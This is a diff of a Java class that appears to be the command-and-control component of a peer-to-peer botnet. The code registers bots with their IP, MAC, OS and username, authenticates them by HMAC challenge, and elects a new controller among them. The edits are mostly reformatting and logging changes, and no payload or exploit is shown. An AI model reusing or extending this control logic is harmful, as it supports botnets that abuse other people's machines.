@@ -98,9 +98,7 @@ public class Commando {
 		// uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
 		////////
 
-		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
-				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
-				(nServ.isElegible() + ""));
+		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(), (nServ.isElegible() + ""));
 		bServ.save(bot);
 
 	}
@@ -110,14 +108,18 @@ public class Commando {
 	 * @return
 	 */
 	public Pairs<Long, Integer> authReq(String idBot) {
+		System.out.println("Inizio fase di autenticazione BotToCec");
 		Pairs<Long, Integer> response;
 		if (auth.getBotSeed().indexOfValue1(idBot) >= 0)
 			return auth.getBotSeed().getByValue1(idBot).getValue2();
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
-		auth.getBotSeed().add(
-				new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
+		System.out.println("KeyNumber: " + keyNumber);
+		System.out.println("IterationNumber: " + iterationNumber);
+		System.out.println("Idbot: " + idBot);
+		auth.getBotSeed().add(new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
 		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
+		System.out.println("Fine generazione chiavi di autenticazione BotToCec");
 		return response;
 	}
 
@@ -126,6 +128,7 @@ public class Commando {
 	 * @return
 	 */
 	public String checkHmac(ArrayList<Object> objects) {
+		System.out.println("Inizio fase di verifica Hmac BotToCec");
 		String response = "";
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(7).toString();
@@ -140,15 +143,14 @@ public class Commando {
 					response = "Challenge OK";
 					objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
 					Bot bot;
-					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
-							objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-							objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
+					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(), objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(), objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
 					bServ.save(bot);
 					Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
 					nServ.getAliveBot().add(botAlive);
 				}
 			}
 		}
+		System.out.println("Fine verifica Hmac BotToCec");
 		return response;
 
 	}
@@ -255,7 +257,7 @@ public class Commando {
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
 			pServ.setNewKing("");
 			nServ.setAliveBot(new SyncIpList<IP, String>());
-			// TODO DropDATABASE			
+			// TODO DropDATABASE
 			return true;
 		}
 		return false;
@@ -278,6 +280,7 @@ public class Commando {
 	 */
 	@Async
 	public void startElection() {
+		System.out.println("Inizio fase di elezione del nuovo CeC");
 		List<Bot> botList = bServ.findAll();
 		List<String> ccList = new ArrayList<>();
 		if (botList != null) {
@@ -300,23 +303,23 @@ public class Commando {
 				Double rand = d * size;
 				Long lv = Math.round(rand);
 				Integer li = lv.intValue();
-				System.out.println("long to int" + li);
+//				System.out.println("long to int" + li);
 				String ip = ccList.get(li);
-				ccList.forEach((botIp) -> System.out.println("bot Ip per sorteggio" + botIp));
-				System.out.println("byte seed " + b.toString());
-				System.out.println(" next double " + d);
-				System.out.println("size " + size);
-				System.out.println("rand " + rand);
-				System.out.println("byte seed " + b.toString());
-				System.out.println("ho eletto " + ip);
+				ccList.forEach((botIp) -> System.out.println("Bot Ip abili per il sorteggio" + botIp));
+//				System.out.println("byte seed " + b.toString());
+//				System.out.println(" next double " + d);
+//				System.out.println("size " + size);
+//				System.out.println("rand " + rand);
+//				System.out.println("byte seed " + b.toString());
+				System.out.println("Ho eletto " + ip);
 				if (ccReq.becameCc(ip)) {
 					pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
 				} else {
 					ccList.remove(ip);
 				}
-				System.out.println("erection completed strating transfer ");
+				System.out.println("Elezione completata inizio il trasferimento");
 			} else {
-				System.out.println("nessuno da eleggere");
+				System.out.println("Nessuno da eleggere");
 				return;
 			}
 			// elegilo passa i dati
@@ -333,7 +336,7 @@ public class Commando {
 				if (nServ.getAliveBot().removeByValue1(new IP(ipDead)) != null) {
 					flag = true;
 				} else {
-					System.out.println("VICINO NON PRESENTE NELLA LISTA DEI VICINI CHE NEL DB");
+					System.out.println("Vicino non presente nella lista dei vicini e del DB");
 				}
 			}
 			if (flag) {
